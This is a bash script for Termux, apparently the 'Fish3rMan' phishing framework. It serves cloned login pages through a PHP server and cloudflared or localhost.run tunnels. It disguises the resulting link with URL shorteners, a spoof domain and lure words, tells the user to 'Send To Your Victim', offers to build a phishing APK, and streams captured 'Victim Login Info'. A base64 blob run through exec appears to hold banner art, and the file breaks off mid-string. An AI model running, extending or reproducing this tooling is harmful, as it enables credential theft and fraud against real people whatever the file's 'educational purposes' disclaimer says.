#!/data/data/com.termux/files/usr/bin/bash
RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
ORANGE="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"
YELLOW="$(printf '\033[1;33m')"
RESET="\e[0m"

echo -e "$ORANGE[∆]$RED Powered By$BLUE ~GhostHub~ $RESET"
sleep 2

function server() {
args="$1"
if [[ $3 == "3" ]]; then
  tput civis
  for X in "\033[32m${args}\033[31m•\033[34m.....\033[00m" "\033[33m${args}.\033[31m•\033[34m....\033[00m" "\033[36m${args}..\033[31m•\033[34m...\033[00m" "\033[35m${args}...\033[31m•\033[34m..\033[00m" "\033[34m${args}....\033[31m•\033[34m.\033[00m" "\033[37m${args}.....\033[31m•\033[00m" "\033[32m${args}\033[31m•\033[34m.....\033[00m" "\033[33m${args}.\033[31m•\033[34m....\033[00m" "\033[36m${args}..\033[31m•\033[34m...\033[00m" "\033[35m${args}...\033[31m•\033[34m..\033[00m" "\033[34m${args}....\033[31m•\033[34m.\033[00m" "\033[37m${args}.....\033[31m•\033[00m" "\033[32m${args}\033[31m•\033[34m.....\033[00m" "\033[33m${args}.\033[31m•\033[34m....\033[00m" "\033[36m${args}..\033[31m•\033[34m...\033[00m" "\033[35m${args}...\033[31m•\033[34m..\033[00m" "\033[34m${args}....\033[31m•\033[34m.\033[00m" "\033[37m${args}.....\033[31m•\033[00m" "\033[37m$2" 
  do
    echo -en "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$X"
    sleep 0.1
  done
  echo
  tput cnorm
elif [[ $3 == "2" ]]; then
  tput civis
  for X in "\033[32m${args}\033[31m•\033[34m.....\033[00m" "\033[33m${args}.\033[31m•\033[34m....\033[00m" "\033[36m${args}..\033[31m•\033[34m...\033[00m" "\033[35m${args}...\033[31m•\033[34m..\033[00m" "\033[34m${args}....\033[31m•\033[34m.\033[00m" "\033[37m${args}.....\033[31m•\033[00m" "\033[32m${args}\033[31m•\033[34m.....\033[00m" "\033[33m${args}.\033[31m•\033[34m....\033[00m" "\033[36m${args}..\033[31m•\033[34m...\033[00m" "\033[35m${args}...\033[31m•\033[34m..\033[00m" "\033[34m${args}....\033[31m•\033[34m.\033[00m" "\033[37m${args}.....\033[31m•\033[00m" "\033[37m$2"
  do
  echo -en "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$X"
  sleep 0.1
  done
  echo
  tput cnorm
elif [[ $3 == "1" ]]; then
  tput civis
  for X in "\033[32m${args}\033[31m•\033[34m.....\033[00m" "\033[33m${args}.\033[31m•\033[34m....\033[00m" "\033[36m${args}..\033[31m•\033[34m...\033[00m" "\033[35m${args}...\033[31m•\033[34m..\033[00m" "\033[34m${args}....\033[31m•\033[34m.\033[00m" "\033[37m${args}.....\033[31m•\033[00m" "\033[37m$2"
  do
  echo -en "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$X"
  sleep 0.1
  done
  echo
  tput cnorm
else
echo ""
fi
}

function check_connection() {
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -eq 0 ];then
    echo ""
else
    echo -e "$RED[!]$ORANGE Checking Network Connection...$BLUE"
    process 12
    echo -e "$MAGENTA [Ops!] $RED Your are Offline or your internet connection might be slow,Try Again!! $RESET" 
    exit 1
fi    
}

function process() {
    
[[ $# -ne 1 ]] && error 1
[[ $1 =~ ^[0-9]+$ ]] || error 2

duration=${1}
barsize=$((`tput cols` - 7))
unity=$(($barsize / $duration))
increment=$(($barsize%$duration))
skip=$(($duration/($duration-$increment)))
curr_bar=0
prev_bar=
for (( elapsed=1; elapsed<=$duration; elapsed++ ))
do
  # Elapsed
  prev_bar=$curr_bar
  let curr_bar+=$unity
  [[ $increment -eq 0 ]] || {  
    [[ $skip -eq 1 ]] &&
      { [[ $(($elapsed%($duration/$increment))) -eq 0 ]] && let curr_bar++; } ||
	{ [[ $(($elapsed%$skip)) -ne 0 ]] && let curr_bar++; }
  }
  [[ $elapsed -eq 1 && $increment -eq 1 && $skip -ne 1 ]] && let curr_bar++
  [[ $(($barsize-$curr_bar)) -eq 1 ]] && let curr_bar++
  [[ $curr_bar -lt $barsize ]] || curr_bar=$barsize
  for (( filled=0; filled<=$curr_bar; filled++ )); do
    printf "▇"
  done

  # Remaining
  for (( remain=$curr_bar; remain<$barsize; remain++ )); do
    printf " "
  done

  # Percentage
  printf "| %s%%" $(( ($elapsed*100)/$duration))

  # Return
  sleep 1
  printf "\r"
done
printf "\n"
}


function execute_parm() {
chmod -R 777 data.txt
chmod -R 777 fingerprints.txt
chmod -R 777 .host
chmod -R 777 .pages
chmod -R 777 .tunnels_log
chmod -R 777 .www    
if [[ -x ".host/cloudflared" ]];then
echo ""
else
    echo -e "$RED [!] Can't execute here $CYAN $PWD $ORANGE Please run on your Root/Home Path in Terminal"
    echo -e "$RED [~] If Your Terminal Support Root Better For You,Please Run This As Root"
    sleep 4
    exit 1
fi  

}

function check_avl_pkg() {
    check_connection
    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages...$RESET"

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Congratulations Required Packages already installed."
	else
		pkgs=(php curl wget python3)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ exit 1; }
				fi
			}
		done
	fi

}


# Directories
if [[ ! -d ".host" ]]; then
	mkdir -p ".host"
fi

if [[ ! -d ".www" ]]; then
	mkdir -p ".www"
fi

function apk_injection() {
echo -ne "[?]$ORANGE Do You Want To Make Phishing Apk ? [Y/n] : $RESET"  
read response
if [[ $response == "n" || $response == "N" ]];then
sleep 2
credentials
elif [[ $response == "y" || $response == "Y" ]];then
apktool_Check
else
echo -e "$RED [!] Wrong Response"
    sleep 3
    apk_injection
fi
}

function url_mask() {

srturl=$(wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=$cldflr_url) 

echo -e "$RED[+]$BLUE Shortner URL $RESET : $srturl "
sleep 2
echo -ne "[?]$ORANGE Do You Want To Bind With Domain ? [Y/n] : $RESET"  
read response
if [[ $response == "n" || $response == "N" ]];then
sleep 2
apk_injection
elif [[ $response == "y" || $response == "Y" ]];then
short=$(curl -s https://da.gd/s/?url=${srturl})
shorter=${short#https://}
echo
echo -e "$GREEN         ### Start Bind With Domain ### $RESET"
echo -e "[+]$YELLOW Enter Domain to Bind Phising URL $GREEN (with http or https)$RESET ex https://google.com, http://anything.com) => "
echo
read mask
echo -e "[?]$CYAN Type Social Engineering Words like $RESET (new-offer, free-money, best-tricks,media-news)"
echo
echo -e "[+] $RED Don't use space just use '-' between words $RESET"
echo
read words
echo "$GREEN"
process 12
echo
echo -e "[+] $BLUE Here is Your Binded URL..$RESET"
echo
final=$mask-$words@$shorter
echo $final
sleep 3
echo -e "[≠] $MAGENTA Copy the Link & Send To Your Victim $RESET"
sleep 4
credentials
else
    echo -e "$RED [!] Wrong Response"
    sleep 3
    url_mask
fi
}

# Cloudflared Download
get_cloudflared() {
    
    check_connection
	
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
	
		rm -rf "$file"
	fi
	
	wget --no-check-certificate "$url" > /dev/null 2>&1
	echo "$GREEN"
	process 12
	
	if [[ -e "$file" ]]; then
		mv -f "$file" .host/cloudflared > /dev/null 2>&1
		chmod +x .host/cloudflared > /dev/null 2>&1
		
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error, Install Cloudflared manually."
		{ clear; exit 1; }
	fi
}

# Download and install Localhostrun

localhostrun_download_and_install() {
	if [[ `command -v ssh -R 80:localhost:8080 nokey@localhost.run` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalhostRun already installed."
		sleep 1
	
	else
	
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Downloading and Installing LocalhostRun..."${WHITE}
		
		ssh -R 80:localhost:8080 nokey@localhost.run
	fi 	
   
}

# Download and install Cloudflared 

cloudflared_download_and_install() {
    
    check_connection
	
	if [[ -e ".host/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
		sleep 1
	
	else
	
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Downloading and Installing Cloudflared..."${WHITE}
		
		architecture=$(uname -m)
		
		if [[ ("$architecture" == *'arm'*) || ("$architecture" == *'Android'*) ]]; then
			get_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		
		elif [[ "$architecture" == *'aarch64'* ]]; then
			get_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		
		elif [[ "$architecture" == *'x86_64'* ]]; then
			get_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		
		else
			get_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}

function apk_injectioner() {
echo -ne "[?]$ORANGE Do You Want To Make Phishing Apk ? [Y/n] : $RESET"  
read response
if [[ $response == "n" || $response == "N" ]];then
sleep 2
otp_data
elif [[ $response == "y" || $response == "Y" ]];then
apktool_Checker
else
echo -e "$RED [!] Wrong Response"
    sleep 3
    apk_injectioner
fi    
}


function url_masker() {
    
srturl=$(wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=$cldflr_url) 

echo -e "$RED[+]$BLUE Shortner URL $RESET : $srturl "
sleep 2    
echo -ne "[?]$ORANGE Do You Want To Bind With Domain ? [Y/n] : $RESET"  
read response
if [[ $response == "n" || $response == "N" ]];then
sleep 2
apk_injectioner
elif [[ $response == "y" || $response == "Y" ]];then
short=$(curl -s https://da.gd/s/?url=${srturl})
shorter=${short#https://}
echo
echo -e "$GREEN         ### Start Bind With Domain ### $RESET"
echo -e "[+]$YELLOW Enter Domain to Bind Phising URL $GREEN (with http or https)$RESET ex https://google.com, http://anything.com) => "
echo
read mask
echo -e "[?]$CYAN Type Social Engineering Words like $RESET (new-offer, free-money, best-tricks,media-news)"
echo
echo -e "[+] $RED Don't use space just use '-' between words $RESET"
echo
read words
echo "$GREEN"
process 12
echo
echo -e "[+] $BLUE Here is Your Binded URL..$RESET"
echo
final=$mask-$words@$shorter
echo $final
sleep 3
echo -e "[≠] $MAGENTA Copy the Link & Send To Your Victim"
sleep 4
otp_data
else
    echo -e "$RED [!] Wrong Response"
    sleep 3
    url_masker
fi
}

setup_cloner(){
	
    # Setup cloned page and server
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up pages..."${WHITE}
	if [ -z "$(ls -A .www)" ];then
       echo ""
    else
       cd .www
       rm -rf *
       cd ..
    fi 
    cp -r -f .sites/"$web"/* .www
    server Starting your php server... 3
	cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 
    sleep 3
}

localhost_starter() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_cloner
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	otp_data
}

# Start Cloudflared
# 
cloudflared_starter() { 
    
    check_connection
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
	{ sleep 1; setup_cloner; }
	server Launching Cloudflared... 3
	
    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi
	
	{ sleep 9; clear; header; }
	
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
	sleep 3
	echo -e "[≠] $MAGENTA Copy the Link & Send To Your Victim $RESET"
	sleep 4
	url_masker
}


# Start localrun
localhostrun_starter() {
    
    check_connection
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_cloner; }
	server Launching LocalhostRun... 3
   
    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi
    
	{ sleep 9; clear; header; }
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	otp_data

}

# Print credentials from victim
otp_data() {
    
   CMD=$(pwd)
   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Victim Login Info.. ${BLUE}Ctrl + C ${MAGENTA}to exit...$RESET\n"
   
   echo "$RED"
   
   tail -f $CMD/.www/log.txt  
	
}
# Clear content of log files

truncate -s 0 .tunnels_log/.cloudfl.log 

truncate -s 0 .tunnels_log/.localrun.log 


pid_kill() {
	
#kill all pid for php and cloudflared
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi

}


function about() {
echo -e "
$MAGENTA ++++ About Section ++++  \n

$ORANGE Fish3rMan is a modern and advanced Hacking Framework For Beginer.Use It Only Your Own Risk.Developer Can't Responsible For This.Use Only Educational Purpose Because Hacking Is A Illigal. \n

$GREEN Made By Ghosthub \n $BLUE Visit For Tools [https://github.com/Ba-hub/Fish3rMan.git] \n

$CYAN The program is made for educational purposes only for to see how the phishing method works.
Any unnecessary use of the program is prohibited and the manufacturer has no responsibility for any illegal use by anyone.
Use the tool at your own risk and avoid any sloppy actions.
"
}

header(){

printf "\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m"    
HAX=$(cat << EOF
import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24zCmltcG9ydCByYW5kb20KCmJhbm5lcjE9ZiIiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAlJiYmJiYmJiYlJiYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJiYmKiovLy8vIyMoKi8vJSYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgJiYoKi8qLyMvKiooLygvKCovJSYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJiYlJiUuLiAgJiglJiYmIyoqLyMvLy8qLy8vKCYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgIC8mJiYgICAgICAgICAgIC4mKi8vLygmJiYoLygvIyMvLyUuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAmJiYgICAgICAgICAgICAgICAgJioqLy8oLy8oJiYjLy8oLy8mICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgIyYmLiAgICAgICAgJiYgICAmJiAgICYmKi8vKCgqKi8vJiYvKi8oJiYgICAgICAgICAgICAgICAgICAgJiYmJiYmJiYmJiYgIAogICAgICwmJiAgICAgICAgICAgJSUuJiUjICAgICUlKiovKCUjKi8vLy8mJiUvLy8mJiAgICAgICAgICAgICAlJigvLy8vLyoqLyYmICAgIAogICAgJiYgICAgICAgICAgICAmICMjIyAsJiAgICAlKiovKC8vJS8vLy8lLygmJiMvKC8mJiAgICAgICAgJiYqKi8vLygvLy8oJiwgICAgIAogICAuJiYmICAgICAgICAgLiAgLiYsICAoJiAgICwmJSovKC8vJSolJS8vJS8vLyYmKCMvLyUmICAgICYmKi8vKCovLy8vLyYlICAgICAgIAogICUmICAgJiYlICAgICAuICAgICAqJiAgICAgICYqKiovKCUqKi8vLyUvLy8oLy8vJiYmJiAgICAgJSYvKiMqLy8oLygvJSYgICAgICAgIAogICAgJiYmICAgICAgICAgICAgICAgICAgICAgJioqKi8vKC8vKi8vLyMvLy8oJS8qKi8lJiUmJiYlJi8vLy8vLygqLy8oJiogICAgICAgIAogICAgICAmJiAgICAgICAgICAgICAgICAgICMmKiooJSUoLy8lLyUvLy8lLy8vLy8qJS8oLy8qJSYmKCMvKiojLyooLy8mJiAgICAgICAgIAogICAgICAgJiYgICAgICAgICAgICAgICAqJioqKiovLyglLyovLy8lLy8vLyUvLy8qJSUlJSUqKioqJiMjLyoqLyovLy8lJiAgICAgICAgIAogICAgICAgICAmJiAgICAgICAgICAgJiYvJSUqLy8oKC8qJS8vLyUvLy8vKCgjJSgqLy8vLyUqKiolJiMqLyooKiovLy8vJiYgICAgICAgIAogICAgICAgICAgLiYlICAgICAgJiYoIyolJigoKCgjLy8qLy8vKC8vLyUvLy8vKiUvLygvJSoqKiomKC8oLyoqKioqLy8vLyYoICAgICAgIAogICAgICAgICAuJSMvIyYlJi8oLy8qKigqJSYvLy8qLyovLy8lLy8vLyUvLy8vJSovKC8lKi8mJSYmIygvLygvKiovLy8vLy8mJSAgICAgIAogICAgICAgICAmJiojKiomJS8qKi8jKiojLyYlJSUvLy8lLy8vKCUvLy8vLy8lKi8lJiYmLygmLiAgIyYmKiwqKioqLygvLy8vIyYgICAgIAogICAgICAgICAmJiojKioqJi8vLy8jKiojKiYmLy8vLy8vJS8vLy8lLyYmJiYlKC8vLy8oLygmICAgICAgICYmJiYlIygvLy8qKi8lJiAgIAogICAgICAgICAgJiYqIyoqIyYqLyojKi8qKCYlJiYmJiYmJiYmJigvLy8oLy8vLy8vLygmJSAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICYqKiomJSgmJSMqKiovJiwgICAgICAmJi8vIyovLy8vKC8vKCYmICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAmJiUmICAgICAgICAgICYmLy8vLyUmJiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKIiIiCmJhbm5lcjI9ZiIiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKCAgLwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgICAoIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoICAgICAgIAogICAgICAgICAgICAgICAgICgoKCMjKCMjIyMjKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyAgICwgICAgIAogICAgICAgICAgICAgICUjIyMjIyMjIyMjIyMjIyMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gICAgICAgICAgIAogICAgICAgICAgICAoIyMjIyMjIyMjKCUjJSUlIyMjJSUlLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqJSAgICAgICAgICAgIAogICAgICAgICAgICMjIyMjIyMjIyUjKCMjIyMjIyMjIyMjIyMjIyMgICAgICAgICAgICAgICAgICAgICAgICAgIC8gICAgICAgICAgICAgIAogICAgICAgICAgICwjIyMlJSMjIyMjIyMjJSUlJSUlJSUlJSUlJSUjICAgICAgICAgICAgICAgICAgICAgICAgKCAgLiAgICAgICAgICAgIAogICAgICAgICAgICAlJSMjIyMjJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgICAgICAgIAogICAgICAgICAgICUjIyMjJSUlJSoqKigjIyMoKiomKiosLCwlJS4sJSAgICAgICAgICAgICAgICAgICAgLiMgICAuICAgICAgICAgICAgIAogICAgICAgICAuIyMjIyUlJSUlLCwsLCwsLCwsLCwqLy4vLCwsJSAgICAgICAgICAgICAgICAgICAgICAgKCAgICAgICAgICAgICAgICAgIAogICggICAgICAjIyMlJSUjJSUsLCwvJSwvICwsLCwsKiMqLCwsLCwgICAgICAgICAgICAgICAgICAgICAoICAgICAgICAgICAgICAgICAgIAogIC8qKi8gICAgIyMjIywsKiwsLCwqLC4sLCwsLCwsLCwsLCwsLC4gICAgICAgICAgICAgICAgICAgICgvICwgICAgICAgICAgICAgICAgIAogICoqKioqKiwgICAgICAsKiwsLCwsLCwsLCwsLCwsLCwsLCwsLCAgICAgICAgICAgICAgICAgICAgIyggJSAgICAgICAgICAgICAgICAgIAogICAoLy8vLy8vICAgICAsKi8gLCwsLCwsLCwlJSMlJSwsLCwsICAgICAgICAgICAgICAgICAgICAgKCAgJiAgICAgICAgICAgICAgICAgIAogICAgIC8vLy8vLy8vLy8vLyAgICAgKiwsLCwsLCwsLCwsLyAgICAgICAgICAgICAgICAgICAgICAuJSAgICAgICAgICAgICAgICAgICAgIAogICAgIC4sLCwvLy8vLyogICAgICAgICAgKioqKioqKi8qICAgICAgICAgICAgICAgICAgICAgICAoICAgICAgICAgICAgICAgICAgICAgIAogICAgLiwsLCwsLywsLC4gICAgICAgKiUjLCwqKioqKiwsLCwoLCAgICAgICAgICAgICAgICAgIC4jICAgICAgICAgICAgICAgICAgICAgIAogICAgLCwqKi8sLywsKiAgICwqLCwsLCwmLCwsLCwsLCwqLCwsJSosICAgICAgICAgICAgICAgICMuICAgICAgICAgICAgICAgICAgICAgIAogICAgLy8vLy8vLy8vICoqLCwsLCwsLCwsLCwsKiosLCwqLCwsLCUjLCogICAgICAgICAgICAvJSggJSAgICAgICAgICAgICAgICAgICAgJQogICAuKiovKi8vLy8vKioqLCwsLCwsLCwsJiUoLCwsLCwsLCwsLCglKioqKiogICAgICAgICAsLiggICAgICAgICAgICAgICAgICAgICAmIAogLy8qKi8qLy8vLy8vLyoqKiwsKioqKiwsLCUlLCwsLCwsKi8sLColJSoqKiosLCwsLCosLCwsKCUqKiAgICAgICAgICAgICAgICAgICAgIAogLyoqLyovLy8vLy8vLy8qLiAgICAgKiosLCUlLCwsLCwsLCwsLCwlJSwsLCwqLCwsLCwsKiosLCwsLCAgICAgICAgICAgICAgICAgICAgIAooLyoqKigvLy8vLy8vLy8vICAgICosLCwsIyUlLCwsLCwsLCwsLCwlJSwgICwqLCAgICosLC8sLCwsICAgICAgICAgICAgICAgICAgICAgIAoqLyoqKi8vKi8vLy8vLy8vICAgICAqKioqJSUsLCwsLCwsKiwqIyYlJiAgICAgICAgICAgLioqKi4mIyAgICAgICAgICAgICAgICAgICAgIAogLyoqKioqKi8vLy8vLy8vICAgICAgJiUlJSUlJSUmJSUlJSUlJSUlQCAgICAgICAgICAgICAjIyUmJi8jICAgICAgICAgICAgICAgICAgIAogICAqKioqKioqLy8vLy8vICAgICAmJSUlJSUlJSUlJSUlJSYlJSUlICAgICAgICAgICAgIC8lJSZAJiwgICAgICAgICAgICAgICAgICAgIAogICAgKCoqLywoLy8vLy8gICAgICAjJSUlJSUlJSUlJSUlJiUmJSUmICAgICAgICAgICAgIChAQEAjLiAgICAgICAgICAgICAgICAgICAgIAogICAgICAqKiovLy8qLy8gICAgICAlJSUlJSUlJSUlJSUmJiYlJSUgICAgICAgICAgICAgICBAJkAqICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICovKC8vICAgICAgIEAlJSUlJSUlJSUlJSUlJSUlJSUgICAgICAgICAgICAgICBAQEBAICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICUlJSUlJSUlJSUjJSUlJSUlJSUvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgJiUlJSUlJSUlJSMgJSUlJSUlJSUlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgIEAmJiUlJSUlJSUlJSAgJSUlJSUmJSUlJiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICUlJSUmJiYlJSUmJS8lJSUlJSUlJSUmICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAqJSUlJSUlJSUlJSAgICoqKiwsKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICosLCoqKioqICAgICAgICwsLCwsLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLywsLCwsLCAgICAgICAgKiwsLCwsLCwjLyouICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgIC4sLCwsLCwsLyAgICAgICAjLy8lKiwsLy8vKioqKioqJiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgKCoqKioqKiovIywlJSAgICAgICAgICAoJS8vLyoqKioqKioqKiogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAqKioqKioqKioqKi8lICAgICAgICAgICAgICAoIy8vKioqKiooLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAjKioqKioqKioqLyYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICgoJSMoKCUoLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKIiIiCmJhbm5lcjM9ZiIiIgogICAgICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAuLi4uLi4uLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAuLi4uLi4uLi4uLi4uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqQAogICAgICAgLC4uLi4qIC4uLi4uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsQEAlIyogICAgICAgICAgICAgICAgICAsKCoqKkAgIAogICAgLi4uLi4uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQCoqKioqKiMqKkAgICAgICAgICAgICAgICAgICBAKioqKiolICAgIAogICAgLi4uLi4uICAgICAgICAgICAgICAgICAgICAgICAgL0BAJSgvKCVAQCoqQCoqKiAgICAgICAgICAgICAgICAgQCoqKioqKiogICAgIAovLy4uKCAgICAgICAgICAgICAgICwjICAgQEAqKioqKioqLyUqKioqKioqKioqKioqKkAgICAgICAgICAgICAgICAmKioqKioqKkAgICAgIAogICAgICAgLi4qICAgICAgICAmICAgICAgICAgKioqKioqKioqKiYqKioqKioqKioqKioqKiolICAgICAgICAgICBAKioqKioqKiAgICAgIAogICAgLy4uLi4uLiAgICAgICNAICAgICMqIC